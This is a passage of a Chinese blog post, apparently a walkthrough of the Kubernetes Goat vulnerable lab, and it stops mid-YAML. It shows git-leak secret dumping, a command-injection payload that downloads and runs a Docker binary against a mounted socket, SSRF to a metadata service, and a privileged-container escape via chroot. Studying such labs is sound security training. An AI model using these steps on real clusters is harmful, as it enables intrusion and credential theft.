@@ -1,0 +1,1254 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Kubernetes,security,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="代码中的敏感keys(Sensitive keys in codebases)网站文字写着（翻译后如下）： 欢迎使用构建代码服务。 该服务是使用具有 CI/CD 管道和现代工具集（如 Git、Docker、AWS 等）的容器构建的。  给的是一个web，就是代码泄露，里面包含了Sensitive keys 可以通过目录爆破工具dirsearch进行目录爆破，确认是git泄露，再用相应工具泄露  通">
+<meta name="keywords" content="Kubernetes,security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kubernetes Goat：Kubernetes 漏洞靶场">
+<meta property="og:url" content="https://www.giantbranch.cn/2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="代码中的敏感keys(Sensitive keys in codebases)网站文字写着（翻译后如下）： 欢迎使用构建代码服务。 该服务是使用具有 CI/CD 管道和现代工具集（如 Git、Docker、AWS 等）的容器构建的。  给的是一个web，就是代码泄露，里面包含了Sensitive keys 可以通过目录爆破工具dirsearch进行目录爆破，确认是git泄露，再用相应工具泄露  通">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655867696983.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655360710352.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655361505563.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655361567304.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655365740259.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655372968803.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655368452535.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655368614907.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655368646137.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655710371323.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655710526301.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655721670803.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655868160342.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655884111674.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655884216613.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655886492294.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1655973767156.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1656059966822.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1656062712836.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1656316053753.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1656316615122.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1656316827296.png">
+<meta property="og:updated_time" content="2023-10-13T13:38:33.762Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Kubernetes Goat：Kubernetes 漏洞靶场">
+<meta name="twitter:description" content="代码中的敏感keys(Sensitive keys in codebases)网站文字写着（翻译后如下）： 欢迎使用构建代码服务。 该服务是使用具有 CI/CD 管道和现代工具集（如 Git、Docker、AWS 等）的容器构建的。  给的是一个web，就是代码泄露，里面包含了Sensitive keys 可以通过目录爆破工具dirsearch进行目录爆破，确认是git泄露，再用相应工具泄露  通">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1655867696983.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/">
+
+
+
+
+
+  <title>Kubernetes Goat：Kubernetes 漏洞靶场 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Kubernetes Goat：Kubernetes 漏洞靶场</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-06-13T00:00:00+00:00">
+                2022-06-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="代码中的敏感keys-Sensitive-keys-in-codebases"><a href="#代码中的敏感keys-Sensitive-keys-in-codebases" class="headerlink" title="代码中的敏感keys(Sensitive keys in codebases)"></a>代码中的敏感keys(Sensitive keys in codebases)</h1><p>网站文字写着（翻译后如下）：</p>
+<p>欢迎使用构建代码服务。 该服务是使用具有 CI/CD 管道和现代工具集（如 Git、Docker、AWS 等）的容器构建的。</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655867696983.png" alt></p>
+<p>给的是一个web，就是代码泄露，里面包含了Sensitive keys</p>
+<p>可以通过目录爆破工具dirsearch进行目录爆破，确认是git泄露，再用相应工具泄露</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655360710352.png" alt></p>
+<p>通过git-dumper下载源码</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655361505563.png" alt></p>
+<p>有一个提交，环境变量比较敏感</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655361567304.png" alt></p>
+<p>切换过去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class="line">Note: checking out &apos;d7c173ad183c574109cd5c4c648ffe551755b576&apos;.</span><br><span class="line"></span><br><span class="line">You are in &apos;detached HEAD&apos; state. You can look around, make experimental</span><br><span class="line">changes and commit them, and you can discard any commits you make in this</span><br><span class="line">state without impacting any branches by performing another checkout.</span><br><span class="line"></span><br><span class="line">If you want to create a new branch to retain commits you create, you may</span><br><span class="line">do so (now or later) by using -b with the checkout command again. Example:</span><br><span class="line"></span><br><span class="line">  git checkout -b &lt;new-branch-name&gt;</span><br><span class="line"></span><br><span class="line">HEAD is now at d7c173a... Inlcuded custom environmental variables</span><br></pre></td></tr></table></figure>
+
+<p>跟原来比，多了一个隐藏文件.env，一看是aws的一些key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ls -a</span><br><span class="line">.  ..  .env  .git  go.mod  go.sum  main.go  README.md</span><br><span class="line">$ cat .env</span><br><span class="line">[build-code-aws]</span><br><span class="line">aws_access_key_id = AKIVSHD6243H22G1KIDC</span><br><span class="line">aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M</span><br><span class="line">k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc</span><br></pre></td></tr></table></figure>
+
+<p>进入pod中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export POD_NAME=$(kubectl get pods --namespace default -l &quot;app=build-code&quot; -o jsonpath=&quot;&#123;.items[0].metadata.name&#125;&quot;)</span><br><span class="line">kubectl exec -it $POD_NAME -- sh</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>trufflehog .</code>来分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/app # trufflehog .</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">Reason: High Entropy</span><br><span class="line">Date: 2020-11-06 22:39:53</span><br><span class="line">Hash: 7daa5f4cda812faa9c62966ba57ee9047ee6b577</span><br><span class="line">Filepath: .env</span><br><span class="line">Branch: origin/master</span><br><span class="line">Commit: updated the endpoints and routes</span><br><span class="line"></span><br><span class="line">@@ -0,0 +1,5 @@</span><br><span class="line">+[build-code-aws]</span><br><span class="line">+aws_access_key_id = AKIVSHD6243H22G1KIDC</span><br><span class="line">+aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M</span><br><span class="line">+k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc</span><br><span class="line">+</span><br><span class="line"></span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">Reason: High Entropy</span><br><span class="line">Date: 2020-11-06 22:39:53</span><br><span class="line">Hash: 7daa5f4cda812faa9c62966ba57ee9047ee6b577</span><br><span class="line">Filepath: go.sum</span><br><span class="line">Branch: origin/master</span><br><span class="line">Commit: updated the endpoints and routes</span><br><span class="line"></span><br><span class="line">@@ -1,496 +1,25 @@</span><br><span class="line">-cloud.google.com/go v0.26.0/go.mod h1:aQUYkXzVsufM+DwF1aE+0xfcU+56JwCaLick0ClmMTw=</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>这个工具可通过pip安装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install trufflehog</span><br></pre></td></tr></table></figure>
+
+<h1 id="DIND-docker-in-docker-exploitation"><a href="#DIND-docker-in-docker-exploitation" class="headerlink" title="DIND (docker-in-docker) exploitation"></a>DIND (docker-in-docker) exploitation</h1><p>这个就是命令注入，之后看到把docker.sock映射到里面了</p>
+<p>/var/run/docker.sock是Docker守护进程(Docker daemon)默认监听的Unix域套接字(Unix domain socket)，假如被映射到容器内，那么我们就可以跟Docker daemon进行通信，从而执行一些命令</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655365740259.png" alt></p>
+<p>可以通过下载docker静态二进制文件进行利用，下面是查看主机上面有什么镜像</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.9.tgz -O /tmp/docker-19.03.9.tgz &amp;&amp; tar -xvzf /tmp/docker-19.03.9.tgz -C /tmp/ ;/tmp/docker/docker -H unix:///custom/docker/docker.sock images</span><br></pre></td></tr></table></figure>
+
+<p>假如利用的话就是拉取指定的后门镜像并运行，运行过程中镜像将宿主机的根目录/挂载到容器内部的/host目录下，便于通过后门容器修改宿主机本地文件(如crontab)来完成逃逸。</p>
+<p>在配置文件中也能看到目录映射</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655372968803.png" alt></p>
+<h1 id="Kubernetes-K8S-中的-SSRF"><a href="#Kubernetes-K8S-中的-SSRF" class="headerlink" title="Kubernetes (K8S) 中的 SSRF"></a>Kubernetes (K8S) 中的 SSRF</h1><p>这是一个内部API代理，5000端口</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655368452535.png" alt></p>
+<p>看到有个metadata-db的东东</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655368614907.png" alt></p>
+<p>不断深入，发现<code>http://metadata-db/latest/secrets/kubernetes-goat</code></p>
+<p><img src="http://pic.giantbranch.cn/pic/1655368646137.png" alt></p>
+<p>解码一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI=&quot; | base64 -d</span><br><span class="line">k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab</span><br></pre></td></tr></table></figure>
+
+<h1 id="容器逃逸-Container-escape-to-the-host-system"><a href="#容器逃逸-Container-escape-to-the-host-system" class="headerlink" title="容器逃逸(Container escape to the host system)"></a>容器逃逸(Container escape to the host system)</h1><p>为了适应更复杂的权限需求，从 2.2 版本起 Linux 内核能够进一步将超级用户的权限分解为细颗粒度的单元，这些单元称为 capabilities。例如，capability CAP_CHOWN 允许用户对文件的 UID 和 GID 进行任意修改，即执行 chown 命令。几乎所有与超级用户相关的特权都被分解成了单独的 capability。</p>
+<p>在docker中可以使用<code>capsh --print</code>输出各种capability权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:/# capsh --print</span><br><span class="line">Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep</span><br><span class="line">Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br><span class="line">Securebits: 00/0x0/1&apos;b0</span><br><span class="line"> secure-noroot: no (unlocked)</span><br><span class="line"> secure-no-suid-fixup: no (unlocked)</span><br><span class="line"> secure-keep-caps: no (unlocked)</span><br><span class="line">uid=0(root)</span><br><span class="line">gid=0(root)</span><br><span class="line">groups=</span><br></pre></td></tr></table></figure>
+
+<p>通过跟正常的机器输出的权限进行对比，基本没什么差别，这是具有所有权限的root</p>
+<p>通过mount命令可以看到挂载了一个/host-system目录</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655710371323.png" alt></p>
+<p>通过df命令也可以看到，只不过我们不确定这是不是挂载的</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655710526301.png" alt></p>
+<p>看名字应该是宿主机目录的，我们ls一下，这看着是整个宿主机的根目录都映射进来了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:~# ls /host-system/</span><br><span class="line">bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var</span><br><span class="line">root@nsfocus:~#</span><br></pre></td></tr></table></figure>
+
+<p>通过chroot命令，我们可以获取宿主机的执行权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:~# chroot /host-system/ bash</span><br><span class="line">root@nsfocus:/# ls</span><br><span class="line">bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var</span><br><span class="line">root@nsfocus:/# docker ps</span><br><span class="line">CONTAINER ID   IMAGE                                                 COMMAND                  CREATED      STATUS      PORTS     NAMES</span><br><span class="line">f0a9afd6f2b6   madhuakula/k8s-goat-info-app                          &quot;python /app.py&quot;         3 days ago   Up 3 days             k8s_info-app_internal-proxy-deployment-5d99cbbdf7-wqmgr_default_efb4eb97-4aa0-4da2-9a93-a0a5dc762649_0</span><br><span class="line">628fcee2fd49   madhuakula/k8s-goat-internal-api                      &quot;docker-entrypoint.s…&quot;   4 days ago   Up 4 days             k8s_internal-api_internal-proxy-deployment-5d99cbbdf7-wqmgr_default_efb4eb97-4aa0-4da2-9a93-a0a5dc762649_0</span><br><span class="line">df0495417aa4   registry.aliyuncs.com/google_containers/pause:3.4.1   &quot;/pause&quot;                 4 days ago   Up 4 days             k8s_POD_internal-proxy-deployment-5d99cbbdf7-wqmgr_default_efb4eb97-4aa0-4da2-9a93-a0a5dc762649_0</span><br><span class="line">5702cc4cdd60   madhuakula/k8s-goat-system-monitor                    &quot;gotty -w bash&quot;          4 days ago   Up 4 days             k8s_system-monitor_system-monitor-deployment-594c89b48f-97rs9_default_081f809d-8199-44bd-8f86-ac6942df3dc8_0</span><br><span class="line">9c1ca7ec8f1a   madhuakula/k8s-goat-poor-registry                     &quot;/entrypoint.sh regi…&quot;   4 days ago   Up 4 days             k8s_poor-registry_poor-registry-deployment-6746b95974-j9xrw_default_d4820b3b-48f0-4ebb-9657-c24d677c73cb_0</span><br><span class="line">c8993f38a99d   madhuakula/k8s-goat-home                              &quot;/docker-entrypoint.…&quot;   4 days ago   Up 4 days             k8s_kubernetes-goat-home_kubernetes-goat-home-deployment-757f96b7cd-tq5zh_default_ef99f1cd-b0ff-4d6a-9a2e-6443acba79ee_0</span><br><span class="line">4a7f97587378   madhuakula/k8s-goat-hidden-in-layers                  &quot;sh -c &apos;tail -f /dev…&quot;   4 days ago   Up 4 days             k8s_hidden-in-layers_hidden-in-layers-lbwbn_default_2ab7372a-e434-4cae-8ede-beca97d662ab_0</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>还可以通过kubectl控制，查看集群（这里需要指定配置文件）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:/# kubectl --kubeconfig /etc/kubernetes/kubelet.conf get pods</span><br><span class="line">NAME                                               READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-check-job-mrd2q                              0/1     Completed   0          4d4h</span><br><span class="line">build-code-deployment-99d5f65db-hxllz              1/1     Running     0          4d4h</span><br><span class="line">health-check-deployment-66c59d7f6f-qf5b7           1/1     Running     0          4d4h</span><br><span class="line">hidden-in-layers-lbwbn                             1/1     Running     0          4d4h</span><br><span class="line">internal-proxy-deployment-5d99cbbdf7-wqmgr         2/2     Running     0          3d23h</span><br><span class="line">kubernetes-goat-home-deployment-757f96b7cd-tq5zh   1/1     Running     0          4d4h</span><br><span class="line">metadata-db-77987b74b-2tqjr                        1/1     Running     0          4d4h</span><br><span class="line">poor-registry-deployment-6746b95974-j9xrw          1/1     Running     0          4d4h</span><br><span class="line">system-monitor-deployment-594c89b48f-97rs9         1/1     Running     0          4d4h</span><br><span class="line">root@nsfocus:/# kubectl --kubeconfig /etc/kubernetes/kubelet.conf get nodes</span><br><span class="line">NAME         STATUS   ROLES                  AGE     VERSION</span><br><span class="line">k8s-master   Ready    control-plane,master   4d20h   v1.21.13</span><br><span class="line">nsfocus      Ready    &lt;none&gt;                 4d20h   v1.21.13</span><br></pre></td></tr></table></figure>
+
+<p>我们查看一下部署的yaml文件，可以看到除了挂载根目录到/host-system，securityContext那里还有allowPrivilegeEscalation: true和privileged: true，这两个可是很危险的，跟docker的–privileged</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat/scenarios/system-monitor# cat deployment.yaml </span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Secret</span><br><span class="line">metadata:</span><br><span class="line">  name: goatvault</span><br><span class="line">type: Opaque</span><br><span class="line">data:</span><br><span class="line">  k8sgoatvaultkey: azhzLWdvYXQtY2QyZGEyNzIyNDU5MWRhMmI0OGVmODM4MjZhOGE2YzM=</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">volumes:</span><br><span class="line">      - name: host-filesystem</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /</span><br><span class="line">      containers:</span><br><span class="line">      - name: system-monitor</span><br><span class="line">        image: madhuakula/k8s-goat-system-monitor</span><br><span class="line">        resources:</span><br><span class="line">          limits:</span><br><span class="line">            memory: &quot;50Mi&quot;</span><br><span class="line">            cpu: &quot;20m&quot;</span><br><span class="line">        securityContext:</span><br><span class="line">          allowPrivilegeEscalation: true</span><br><span class="line">          